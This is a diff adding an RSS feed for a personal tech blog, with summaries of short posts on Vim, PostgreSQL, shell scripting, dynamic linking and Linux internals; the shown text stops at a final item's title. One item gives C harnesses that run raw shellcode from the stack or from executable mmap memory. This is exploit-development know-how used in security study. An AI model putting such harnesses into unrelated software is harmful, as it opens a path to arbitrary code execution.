@@ -1,0 +1,1292 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>warrick.io</title>
+    <link>//warrick.io/</link>
+    <description>Recent content on warrick.io</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 10 Jun 2015 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="//warrick.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>testing awesome config</title>
+      <link>//warrick.io/posts/testing-awesome-config/</link>
+      <pubDate>Wed, 10 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/testing-awesome-config/</guid>
+      <description>Test your awesome wm config in a nested X:
+Xephyr :1 -ac -br -noreset -screen 1152x720 &amp;amp; DISPLAY=:1.0 awesome -c ~/.config/awesome/rc.lua https://wiki.archlinux.org/index.php/Awesome</description>
+    </item>
+    
+    <item>
+      <title>one bad byte</title>
+      <link>//warrick.io/posts/one-bad-byte/</link>
+      <pubDate>Sun, 19 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/one-bad-byte/</guid>
+      <description>Last night both Firefox and Chrome began crashing at startup. After fighting with it for almost an hour I gave up and kept working, resolving to fix them in the morning.
+Well, then Vim started crashing at startup too. Uh uh honey, no no no.
+A tail of dmesg revealed the problem - libm-2.19:
+[10567.643135] traps: python[18389] general protection ip:7efe0933eea2 sp:7ffff5087f30 error:0 in libm-2.19.so[7efe0932a000+105000] [10591.556424] traps: chromium-browse[18584] general protection ip:7f6aaed27ea2 sp:7ffc2a01cf30 error:0 in libm-2.</description>
+    </item>
+    
+    <item>
+      <title>remap capslock in linux</title>
+      <link>//warrick.io/posts/remap-capslock-linux/</link>
+      <pubDate>Mon, 06 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/remap-capslock-linux/</guid>
+      <description>Here is how I map CAPSLOCK + H/J/K/L to the arrow keys in Linux:
+Remap the CAPSLOCK key with xmodmap:
+cat &amp;gt;&amp;gt; ~/.xmodmaprc &amp;lt;&amp;lt;EOF clear Lock keycode 66 = ISO_Level3_Shift EOF Modify the xkb bindings:
+cp /usr/share/X11/xkb/symbols/us ~/xkb-symbols-us.backup sudo sed -i -r &amp;#39;0,/h,\s+H/s//h, H, Left, Left/&amp;#39; /usr/share/X11/xkb/symbols/us sudo sed -i -r &amp;#39;0,/j,\s+J/s//j, J, Down, Down/&amp;#39; /usr/share/X11/xkb/symbols/us sudo sed -i -r &amp;#39;0,/k,\s+K/s//k, K, Up, Up/&amp;#39; /usr/share/X11/xkb/symbols/us sudo sed -i -r &amp;#39;0,/l,\s+L/s//l, L, Right, Right/&amp;#39; /usr/share/X11/xkb/symbols/us  Clean the cache:</description>
+    </item>
+    
+    <item>
+      <title>stay on home row</title>
+      <link>//warrick.io/posts/stay-on-home/</link>
+      <pubDate>Tue, 27 Jan 2015 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/stay-on-home/</guid>
+      <description>I am sick of moving my hands to the mouse and arrow keys. This is my formula on Mac OS X for minimizing mouse usage while I&amp;rsquo;m working:
+MacVim [1] &amp;mdash; Modal editor or bust.
+Spectacle [2] &amp;mdash; moving windows with keyboard shortcuts.
+I prefer vim-like Shift+Command+H/J/K/L for moving windows about.
+Vimium [3] &amp;mdash; Chromium extension for vim-like page navigation shortcuts.
+The easymotion-esque link navigation is just brilliant. You can &amp;lsquo;click&amp;rsquo; links, and complete complex forms without touching the mouse.</description>
+    </item>
+    
+    <item>
+      <title>dynamic linking continued</title>
+      <link>//warrick.io/posts/dynamic-linking-continued/</link>
+      <pubDate>Tue, 16 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/dynamic-linking-continued/</guid>
+      <description>In the last post, I showed how an unlinked library function invokes ld. In this post, I will show what happens in ld.
+I talk about how eglibc does runtime linking in the current Ubuntu 14.04.1. However, it seems the two libraries glibc and eglibc have reconciled their past differences and eglibc has been discontinued. So, likely, Ubuntu will use glibc again in 15.
+In any event, the two should be next to identical.</description>
+    </item>
+    
+    <item>
+      <title>dynamic linking</title>
+      <link>//warrick.io/posts/dynamic-linking/</link>
+      <pubDate>Mon, 15 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/dynamic-linking/</guid>
+      <description>Deciphering the indirection of runtime dynamic linking can be a bit tricky.
+I always seem to forget how the PLT and GOT interact.
+Consider this simple example of calling the puts function in the dynamically linked libc:
+#include &amp;lt;stdio.h&amp;gt; int main(int argc, char *argv[]) { puts(&amp;#34;foo bar baz qux&amp;#34;); return 0; }$ gcc test.c -o test # Show the dynamically linked libraries for the test binary. $ ldd test linux-gate.so.1 =&amp;gt; (0xb77d4000) libc.</description>
+    </item>
+    
+    <item>
+      <title>current directory hell</title>
+      <link>//warrick.io/posts/current-directory-hell/</link>
+      <pubDate>Tue, 09 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/current-directory-hell/</guid>
+      <description>One of the most frustrating and frequent scripting errors I make is in mistaking my current directory and improperly referencing another file or directory.
+I have adopted a scope-like block style for changing directories using pushd and popd:
+#!/bin/bash  mkdir lib/gdb pushd lib/gdb sudo apt-get build-dep -y gdb sudo apt-get install -y libpython2.7 libpython2.7-dev apt-get source gdb pushd gdb-?.?.? ./configure \  --with-python=$VIRTUAL_ENV/bin/python \  --prefix=$VIRTUAL_ENV make make install popd popd</description>
+    </item>
+    
+    <item>
+      <title>highlight column in vim</title>
+      <link>//warrick.io/posts/highlight-column-vim/</link>
+      <pubDate>Sat, 25 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/highlight-column-vim/</guid>
+      <description>:set cc=80:help &amp;#39;colorcolumn&amp;#39;</description>
+    </item>
+    
+    <item>
+      <title>linux program execution</title>
+      <link>//warrick.io/posts/linux-program-execution/</link>
+      <pubDate>Wed, 22 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/linux-program-execution/</guid>
+      <description>How does Linux load a program for execution? Overview
+Loading an ELF executable into memory is handled by the load_elf_binary function in fs/binfmt_elf.c.
+load_elf_binary performs consistency checks, allocates memory, and loads each segment into memory before calling the dynamic linker or starting execution of the program.
+  Function Kernel File Annotation     1 shell  Enter a command.   2 execve()  Shell calls libc function.</description>
+    </item>
+    
+    <item>
+      <title>enforcing better typing habits</title>
+      <link>//warrick.io/posts/enforce-better-typing-habits/</link>
+      <pubDate>Tue, 21 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/enforce-better-typing-habits/</guid>
+      <description>Bad Typing Habits Touch typing rules state that the shift key is always pressed by the pinky finger opposite the finger pressing the other key.
+Unfortunately, I have the bad habit of using the right shift for semicolons, double quotes, curly braces, and question marks, which requires lifting my right hand.
+As I become dependent on VIM for everyday coding, I also become increasingly aware of any keystrokes that drag my hands away from the home row.</description>
+    </item>
+    
+    <item>
+      <title>selected pasted text in vim</title>
+      <link>//warrick.io/posts/select-pasted-vim/</link>
+      <pubDate>Tue, 21 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/select-pasted-vim/</guid>
+      <description>Select the previously pasted text
+nnoremap gp `[v`] http://vim.wikia.com/wiki/Selecting_your_pasted_text</description>
+    </item>
+    
+    <item>
+      <title>_start to main</title>
+      <link>//warrick.io/posts/start-to-main/</link>
+      <pubDate>Mon, 20 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/start-to-main/</guid>
+      <description>Compiled with libc, a program&amp;rsquo;s _start procedure will simply call __libc_start_main:
+_start: xor ebp, ebp ; zero ebp as recommended by ABI spec  pop esi ; pop argc into esi  mov ecx, esp ; move **argv to ecx, without altering stack  and esp, 0FFFFFFF0h ; mask clears bottom 4 bits, 16 byte align  push eax ; setup args for __libc_start_main [1]  push esp ; push *stack_end  push edx ; push *rtld_fini, linker destructor  push offset __libc_csu_fini ; push *fini, finalizer function pointer  push offset __libc_csu_init ; push *init, initializer function pointer  push ecx ; push **ubp_av, argv from stack  push esi ; push argc, argc from stack  push offset main ; push address of main(argc, argv, envp)  call ___libc_start_main ; call __libc_start_main procedure  hlt ; halt programint __libc_start_main( int (*main) (int, char**, char**), int argc, char **ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end) ); [1]: push eax is junk; only added to align to 8 arguments; never used.</description>
+    </item>
+    
+    <item>
+      <title>underclock a hot processor</title>
+      <link>//warrick.io/posts/underclock-a-hot-processor/</link>
+      <pubDate>Mon, 13 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/underclock-a-hot-processor/</guid>
+      <description>I have a 125 watt processor that runs hot and overheats under heavy loads. Yeah it is a bit dusty. As a stopgap, until I get around to ordering a proper fan, I found a simple way to underclock the CPUs to keep it a bit cooler.
+sudo apt-get install cpufrequtils for cpu in {0..3}; do sudo cpufreq-set -g userspace -c $cpu sudo cpufreq-set -u 2.20Ghz -c $cpu done You can check the available governors and current configuration with the cpufreq-info command:</description>
+    </item>
+    
+    <item>
+      <title>vim insert before pattern</title>
+      <link>//warrick.io/posts/vim-newline-before-pattern/</link>
+      <pubDate>Thu, 02 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/vim-newline-before-pattern/</guid>
+      <description>Inserting a newline before lines matching a pattern, e.g. before comments #:
+:g/^#/norm O http://stackoverflow.com/a/2673266/255528</description>
+    </item>
+    
+    <item>
+      <title>open all vim buffers in tabs</title>
+      <link>//warrick.io/posts/vim-buffers-to-tabs/</link>
+      <pubDate>Wed, 17 Sep 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/vim-buffers-to-tabs/</guid>
+      <description>:bufdo tab split</description>
+    </item>
+    
+    <item>
+      <title>find duplicate files</title>
+      <link>//warrick.io/posts/find-duplicate-files/</link>
+      <pubDate>Thu, 19 Jun 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/find-duplicate-files/</guid>
+      <description>Find duplicate files first by file size and then MD5 sum, with a progress bar:
+find -not -empty -type f -printf &amp;#34;%s\n&amp;#34; \  | sort -rn \  | uniq -d \  | xargs -I{} -n1 find -type f -size {}c -print0 \  | tee \  | pv --line-mode --size $(find . -type f | wc -l) \  | xargs -0 md5sum \  | sort \  | uniq -w32 --all-repeated=separate \  | tee /tmp/duplicates http://www.</description>
+    </item>
+    
+    <item>
+      <title>spin down idle hard drive</title>
+      <link>//warrick.io/posts/spin-down-idle-hard-drive/</link>
+      <pubDate>Fri, 23 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/spin-down-idle-hard-drive/</guid>
+      <description>I noticed that my external hard drive, which uses a cheap SATA to USB enclosure, was constantly spinning, even when I hadn&amp;rsquo;t accessed it in hours.
+I decided to lookup how to coax the drive to spin down.
+A little searching showed that you can check a drive&amp;rsquo;s status and set its idle timeout policy with the hdparm command.
+$ sudo hdparm -C /dev/sdb /dev/sdb: drive state is: active/idle Setting the timeout is a little odd, the value 120 means 10 minutes.</description>
+    </item>
+    
+    <item>
+      <title>postgres histogram</title>
+      <link>//warrick.io/posts/postgres-histogram/</link>
+      <pubDate>Thu, 22 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/postgres-histogram/</guid>
+      <description>A huge thank you for this little gem &amp;mdash; a quick and dirty histogram in PostgreSQL:
+WITH stats AS ( SELECT min(__value__) , max(__value__) FROM __table__ ), histogram AS ( SELECT WIDTH_BUCKET(__value__, min, max, 9) --&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;  AS bucket , MIN(__value__) , MAX(__value__) , COUNT(*) AS freq FROM __table__ CROSS JOIN stats GROUP BY bucket ORDER BY bucket ) SELECT bucket , min , max , freq , REPEAT(&amp;#39;*&amp;#39;, (freq::FLOAT / max(freq) over() * 30)::INT) AS bar FROM histogram ;bucket | min | max | freq | bar --------+-------+-------+--------+-------------------------------- 1 | 0 | 8517 | 294826 | ****************************** 2 | 8577 | 16400 | 73992 | ******** 3 | 17563 | 25200 | 8202 | * 4 | 26219 | 33651 | 853 | 5 | 34560 | 42600 | 1312 | 6 | 43200 | 51063 | 2592 | 7 | 53104 | 59037 | 9 | 8 | 60000 | 68400 | 17 | 9 | 68577 | 76833 | 54 | 10 | 77060 | 85499 | 60 | Visualize the frequency distribution of some __value__ in your __table__, and adjust the number of buckets to increase the resolution.</description>
+    </item>
+    
+    <item>
+      <title>don&#39;t save shortcut</title>
+      <link>//warrick.io/posts/mac-dont-save/</link>
+      <pubDate>Tue, 20 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/mac-dont-save/</guid>
+      <description>Seven years I have been using Mac OS X, and this entire time I have hated moving my hand to the mouse to select the &amp;ldquo;Don&amp;rsquo;t Save&amp;rdquo; button on exit dialog menus.
+Well, I finally looked up the shortcut and then I promptly forgot it. This time, I am writing it down. Here it is, and I hope it helps.
+Command-D
+Selects &amp;quot;Don&#39;t Save&amp;quot; in dialogs that contain a Don&#39;t Save button, in Mac OS X v10.</description>
+    </item>
+    
+    <item>
+      <title>git sparse checkout</title>
+      <link>//warrick.io/posts/git-sparse-checkout/</link>
+      <pubDate>Wed, 23 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/git-sparse-checkout/</guid>
+      <description>One thing I missed after switching to git from svn was the ability to checkout a single directory.
+Well, it seems that the ability to partially checkout a repository was added to git in February of 2012, and I am way behind.
+Here is how you perform a sparse checkout:
+# Initialize git init [repo] cd [repo] # Fetch git remote add -f origin [url] # Configure git config core.sparsecheckout true echo &amp;#34;path/to/dir&amp;#34; &amp;gt;&amp;gt; .</description>
+    </item>
+    
+    <item>
+      <title>partial uniq using a lru cache</title>
+      <link>//warrick.io/posts/partial-uniq-with-lru-cache/</link>
+      <pubDate>Wed, 02 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/partial-uniq-with-lru-cache/</guid>
+      <description>Recently, I was faced with the challenge of removing duplicate lines from a number of large data files.
+Typically, I use a combination or sort and uniq or just sort -u, but in this circumstance many duplicate lines were close together.
+I found that, first, partially filtering duplicates by using a LRU cache to keep track of and omit recently seen lines doubled the speed.
+#!/usr/bin/env python # file: lru-uniq.py import fileinput from repoze.</description>
+    </item>
+    
+    <item>
+      <title>useful ruby switches</title>
+      <link>//warrick.io/posts/useful-ruby-switches/</link>
+      <pubDate>Thu, 27 Mar 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/useful-ruby-switches/</guid>
+      <description>Ruby is excellent for writing one-off scripts, and there are a lot of extremely useful flags for integrating Ruby into pipelines.
+-n Iterate over input file; automatically wraps script in: while gets ... end -a Turns on auto-split mode when used with -n or -p. Executes $F = $_.split at beginning of each loop. -l Automatically .chops! line read, removing trailing \r and \n bytes. -F Specifies input field separator; use -a, access fields with $F.</description>
+    </item>
+    
+    <item>
+      <title>reselect visual block in vim</title>
+      <link>//warrick.io/posts/vim-reselect-visual-block/</link>
+      <pubDate>Mon, 24 Mar 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/vim-reselect-visual-block/</guid>
+      <description>I try to minimize visual block usage in favor of gestures, but for whatever reason I have been neglecting a very important shortcut for reselecting the previously selected text.</description>
+    </item>
+    
+    <item>
+      <title>syntax highlighting in psql vim session</title>
+      <link>//warrick.io/posts/psql-editor-highlighting/</link>
+      <pubDate>Sun, 23 Mar 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/psql-editor-highlighting/</guid>
+      <description>If you spend a lot of time using psql, you should definitely use the \e and \ef commands to edit queries and functions in VIM.
+\e [FILE] [LINE] edit the query buffer (or file) with external editor \ef [FUNCNAME [LINE]] edit function definition with external editor One annoyance is that, because the temporary file created doesn&amp;rsquo;t have a .sql extension, VIM doesn&amp;rsquo;t enable syntax highlighting.
+Here is a simple autocmd that will turn syntax highlighting on that match psql&amp;rsquo;s filename pattern:</description>
+    </item>
+    
+    <item>
+      <title>soft wrapping in vim</title>
+      <link>//warrick.io/posts/vim-soft-wrapping/</link>
+      <pubDate>Sat, 22 Mar 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/vim-soft-wrapping/</guid>
+      <description>By default, wrap in VIM will break lines in the middle of words.
+To enable soft wrapping, wrapping without breaking words, simply enable linebreak.
+:set wrap:set linebreak http://vimcasts.org/episodes/soft-wrapping-text/</description>
+    </item>
+    
+    <item>
+      <title>fix slow ssh logins v2</title>
+      <link>//warrick.io/posts/fix-ssh-logins-v2/</link>
+      <pubDate>Mon, 17 Mar 2014 00:00:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/fix-ssh-logins-v2/</guid>
+      <description>Newer versions of OpenSSH attempt to reverse resolve client IP addresses. This can cause slow ssh connections if the client IP does not reverse resolve as the DNS request will be attempted multiple times and timeout each time.
+To fix the problem, disable it in your /etc/ssh/sshd_config:
+UseDNS no</description>
+    </item>
+    
+    <item>
+      <title>trap to cleanup</title>
+      <link>//warrick.io/posts/trap-to-cleanup/</link>
+      <pubDate>Mon, 20 Jan 2014 22:48:10 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/trap-to-cleanup/</guid>
+      <description>function cleanup() { rm -v $TEMPFILE } # catch HUP, INT, QUIT, and TERM trap cleanup 1 2 3 15</description>
+    </item>
+    
+    <item>
+      <title>vim tips day 01</title>
+      <link>//warrick.io/posts/vim-tips-day-01/</link>
+      <pubDate>Wed, 15 Jan 2014 17:44:31 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/vim-tips-day-01/</guid>
+      <description>Started reading Practical Vim and I&amp;rsquo;m going to start listing tips I should be using more frequently in VIM.
+zz redraw screen with current line in middle CTRL-o execute one command, return to Insert mode CTRL-r {register} paste from register while in Insert mode CTRL-r= use the expression register to evaluate and insert a calculation q: command-line window</description>
+    </item>
+    
+    <item>
+      <title>postgres dblink</title>
+      <link>//warrick.io/posts/postgres-dblink/</link>
+      <pubDate>Wed, 04 Dec 2013 20:05:03 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/postgres-dblink/</guid>
+      <description>Connect to and query a remote PostgreSQL database from a local database.
+First install the dblink extension and enable it for your database, e.g.
+sudo apt-get install postgresql-contrib-9.1 sudo -u postgres psql -c &amp;#39;CREATE EXTENSION dblink;&amp;#39; foo Then connect to the remote database with the dblink_connect function:
+SELECT dblink_connect(&amp;#39;hostaddr=10.0.1.1 port=5432 dbname=foo user=bar password=baz&amp;#39;); http://www.postgresql.org/docs/9.1/static/contrib-dblink-connect.html</description>
+    </item>
+    
+    <item>
+      <title>kill postgres query</title>
+      <link>//warrick.io/posts/kill-postgres-query/</link>
+      <pubDate>Tue, 29 Oct 2013 20:39:45 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/kill-postgres-query/</guid>
+      <description>Find the PID of the query from a system utility like top or htop, or from the &amp;ldquo;pg_catalog.pg_stat_activity&amp;rdquo; table.
+sudo -u postgres psql postgres=# SELECT pg_cancel_backend(28710);</description>
+    </item>
+    
+    <item>
+      <title>pam exec</title>
+      <link>//warrick.io/posts/pam-exec/</link>
+      <pubDate>Tue, 29 Oct 2013 04:07:12 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/pam-exec/</guid>
+      <description>PAM, the Linux Pluggable Authentication Modules, allows you to execute programs and scripts when SSH sessions are opened and closed.
+# /etc/pam.d/sshd session optional pam_exec.so /path/to/script.sh# /path/to/script.sh  #!/bin/bash if [ $PAM_TYPE = &amp;#34;open_session&amp;#34; ]; then # fi exit 0 WARNING:
+Botching your script or failing to return 0 will cause SSH login to fail. Don&amp;rsquo;t lock yourself out, test your script!</description>
+    </item>
+    
+    <item>
+      <title>python in postgres</title>
+      <link>//warrick.io/posts/python-in-postgres/</link>
+      <pubDate>Sat, 19 Oct 2013 00:31:15 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/python-in-postgres/</guid>
+      <description>Installing and adding Python to your PostgreSQL database in Ubuntu:
+sudo apt-get install postgresql-plpython-9.1 sudo -u postgres psql -c &amp;#39;CREATE EXTENSION plpythonu;&amp;#39; dbname Check that it was installed:
+psql -c &amp;#39;\dL&amp;#39; dbname List of languages Name | Owner | Trusted -----------+----------+--------- plpgsql | postgres | t plpythonu | postgres | f (2 rows) Keep in mind that Python is an &amp;lsquo;untrusted&amp;rsquo; language meaning that functions written in PL/Pythonu execute in an administrative context.</description>
+    </item>
+    
+    <item>
+      <title>consumer decorator</title>
+      <link>//warrick.io/posts/consumer-decorator/</link>
+      <pubDate>Fri, 18 Oct 2013 20:25:56 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/consumer-decorator/</guid>
+      <description>Just stumbled across this little gem, and I don&amp;rsquo;t want to forget about it. Here is a decorator that takes care of the ugliness in first call to .next(), necessary for receiving coroutines in Python.
+def consumer(func): def start(*args,**kwargs): c = func(*args,**kwargs) c.next() return c return start@consumer def recv_count(): try: while True: n = (yield) # Yield expression print &amp;#34;T-minus&amp;#34;, n except GeneratorExit: print &amp;#34;Kaboom!&amp;#34; http://www.dabeaz.com/coroutines/Coroutines.pdf</description>
+    </item>
+    
+    <item>
+      <title>piping to ruby scripts</title>
+      <link>//warrick.io/posts/piping-to-ruby-scripts/</link>
+      <pubDate>Wed, 16 Oct 2013 23:33:52 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/piping-to-ruby-scripts/</guid>
+      <description>Ruby, instead of exiting when it receives a SIGPIPE, throws an exception Errno:EPIPE which usually results in a stack trace.
+./foo.rb:8:in `write&amp;#39;: Broken pipe - &amp;lt;STDOUT&amp;gt; (Errno::EPIPE) Here is the idiomatic one-line to simply exit when your script gets a SIGPIPE:
+trap(&amp;#39;PIPE&amp;#39;, &amp;#39;EXIT&amp;#39;)</description>
+    </item>
+    
+    <item>
+      <title>tail</title>
+      <link>//warrick.io/posts/tail/</link>
+      <pubDate>Wed, 16 Oct 2013 22:59:37 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/tail/</guid>
+      <description>I didn&amp;rsquo;t know tail could be used to skip lines in a file:
+Numbers having a leading plus (`+&amp;#39;) sign are relative to the beginning of the input# skip first line, start from second line tail -n+2 file</description>
+    </item>
+    
+    <item>
+      <title>delay jquery hover event</title>
+      <link>//warrick.io/posts/delay-jquery-hover-event/</link>
+      <pubDate>Wed, 16 Oct 2013 01:45:23 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/delay-jquery-hover-event/</guid>
+      <description>Suppose you&amp;rsquo;d like to perform an event when the user hovers over an item, but you&amp;rsquo;d like that event to be slightly delayed to reduce sensitivity to inadvertent mouse movements.
+To solve this problem you can decompose the hover action into a mouseenter and mouseleave. Then use a setTimeout to perform your action, but cancel the timer if the mouse leaves too early.
+Using an immediately invoked function closure, you can store the timer object and clear it easily like so:</description>
+    </item>
+    
+    <item>
+      <title>vim reminders</title>
+      <link>//warrick.io/posts/vim-reminders/</link>
+      <pubDate>Tue, 01 Oct 2013 03:56:18 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/vim-reminders/</guid>
+      <description>I always trounce my yank buffer when I delete lines. Don&amp;rsquo;t forget that registers 0-9 are a history of the past 10 yank buffers.
+&amp;#34;0p ... &amp;#34;9p Sometimes, when doing a global search and replace, it is convenient to be prompted before replacing each string.</description>
+    </item>
+    
+    <item>
+      <title>postgres index usage</title>
+      <link>//warrick.io/posts/postgres-index-usage/</link>
+      <pubDate>Mon, 09 Sep 2013 03:16:45 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/postgres-index-usage/</guid>
+      <description>Awesome article on understanding postgres performance had this little nugget, which gives you the tables in your database with the percentage of time they use an index:
+SELECT relname, 100 * idx_scan / (seq_scan + idx_scan) percent_of_times_index_used, n_live_tup rows_in_table FROM pg_stat_user_tables WHERE seq_scan + idx_scan &amp;gt; 0 ORDER BY n_live_tup DESC;</description>
+    </item>
+    
+    <item>
+      <title>split screen</title>
+      <link>//warrick.io/posts/split-screen/</link>
+      <pubDate>Tue, 03 Sep 2013 22:45:09 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/split-screen/</guid>
+      <description>GNU screen allows you to split your screen session into independently operable windows.
+CTRL + a + S - horizontal split CTRL + a + TAB - change split CTRL + a + X - kill current split CTRL + a + :resize N - resize to N lines</description>
+    </item>
+    
+    <item>
+      <title>readline vi mode</title>
+      <link>//warrick.io/posts/readline-vi-mode/</link>
+      <pubDate>Wed, 26 Jun 2013 17:33:13 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/readline-vi-mode/</guid>
+      <description># ~/.inputrcset editing-mode vi</description>
+    </item>
+    
+    <item>
+      <title>i&#39;m still listening </title>
+      <link>//warrick.io/posts/i-m-still-listening/</link>
+      <pubDate>Tue, 25 Jun 2013 16:13:44 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/i-m-still-listening/</guid>
+      <description>I&amp;rsquo;m always listening, Pandora.
+setInterval(function () { $(&amp;#39;.still_listening&amp;#39;).click(); }, 1000);</description>
+    </item>
+    
+    <item>
+      <title>creating a bootable usb in mac os x</title>
+      <link>//warrick.io/posts/creating-a-bootable-usb-in-mac-os-x/</link>
+      <pubDate>Mon, 24 Jun 2013 18:03:52 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/creating-a-bootable-usb-in-mac-os-x/</guid>
+      <description>1) Convert ISO to IMG.
+hdiutil convert -format UDRW -o /path/to/output.img /path/to/input.iso 2) Unmount drive.
+diskutil unmountDisk /dev/diskN 3) Copy IMG to drive.
+sudo dd if=/path/to/output.img of=/dev/rdiskN bs=1m 4) Eject drive.
+diskutil eject /dev/diskN</description>
+    </item>
+    
+    <item>
+      <title>shellcode test harnesses</title>
+      <link>//warrick.io/posts/shellcode-test-harnesses/</link>
+      <pubDate>Tue, 18 Jun 2013 15:18:12 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/shellcode-test-harnesses/</guid>
+      <description>On the stack:
+char sc[] = &amp;#34;...\xCD\x80&amp;#34;; int main() { int *ret; ret = &amp;amp;ret + 2; *ret = (int *) sc; return 0; } On the heap:
+char sc[] = &amp;#34;&amp;#34;; int main() { // mmap(NULL, size, 7, 34, -1, 0);  void *map = mmap(NULL, strlen(sc), PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); memcpy(map, sc, strlen(sc)); ((int(*)())map)(); }</description>
+    </item>
+    
+    <item>
+      <title>vim autocomplete</title>
+      <link>//warrick.io/posts/vim-autocomplete/</link>
+      <pubDate>Mon, 10 Jun 2013 14:23:57 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/vim-autocomplete/</guid>
+      <description>VIM has word auto-completion built-in, press CTRL+n while in Insert mode:</description>
+    </item>
+    
+    <item>
+      <title>map reduce a csv file</title>
+      <link>//warrick.io/posts/map-reduce-a-csv-file/</link>
+      <pubDate>Sat, 08 Jun 2013 19:54:19 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/map-reduce-a-csv-file/</guid>
+      <description>Map-reduce a CSV files using the incredible UNIX sort utility in just ~24 LOC.
+#!/usr/bin/env python # kwarrick@uga.edu import csv import subprocess from itertools import groupby def map_reduce_csv(mapper, reducer, key, infile, outfile): &amp;#34;&amp;#34;&amp;#34; Map-reduce CSV file using UNIX sort utility. &amp;#34;&amp;#34;&amp;#34; sort = subprocess.Popen( [&amp;#39;/usr/bin/sort&amp;#39;, &amp;#39;-t,&amp;#39;], env={&amp;#39;LC_ALL&amp;#39;: &amp;#39;C&amp;#39;}, stdin=subprocess.PIPE, stdout=subprocess.PIPE, ) # map and sort reader = csv.reader(infile) writer = csv.writer(sort.stdin, quoting=csv.QUOTE_NONE) for row in reader: writer.writerows(mapper(row)) sort.stdin.close() # group and reduce reader = csv.</description>
+    </item>
+    
+    <item>
+      <title>parsing DNS messages with ruby</title>
+      <link>//warrick.io/posts/parsing-dns-messages-with-ruby/</link>
+      <pubDate>Fri, 07 Jun 2013 20:20:28 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/parsing-dns-messages-with-ruby/</guid>
+      <description>Ruby&amp;rsquo;s core module, resolv, will allow you to easily parse raw DNS messages:
+require &amp;#39;resolv&amp;#39; Resolv::DNS::Message.decode(&amp;#34;\xE8\x84\x81\x80...&amp;#34;) msg.opcode # =&amp;gt; 0  msg.question # =&amp;gt; [[#&amp;lt;Resolv::DNS::Name: segv.me.&amp;gt;, Resolv::DNS::Resource::IN::A]]</description>
+    </item>
+    
+    <item>
+      <title>postgres database and table size</title>
+      <link>//warrick.io/posts/postgres-database-and-table-size/</link>
+      <pubDate>Wed, 05 Jun 2013 23:54:58 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/postgres-database-and-table-size/</guid>
+      <description>SELECT pg_size_pretty(pg_database_size(&amp;#39;foo_db&amp;#39;)); SELECT pg_size_pretty(pg_total_relation_size(&amp;#39;bar_table&amp;#39;));</description>
+    </item>
+    
+    <item>
+      <title>visual block mode</title>
+      <link>//warrick.io/posts/visual-block-mode/</link>
+      <pubDate>Tue, 04 Jun 2013 00:33:31 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/visual-block-mode/</guid>
+      <description>Multi-line text insert: 1. CTRL + V (select column) 2. SHIFT + i (insert) 3. type text 4. ESCMulti-line text append: 1. CTRL + V (select lines) 2. $ (extend block to end of lines) 2. SHIFT + a (append) 3. type text 4. ESC</description>
+    </item>
+    
+    <item>
+      <title>how long is the linux kernel, in miles?</title>
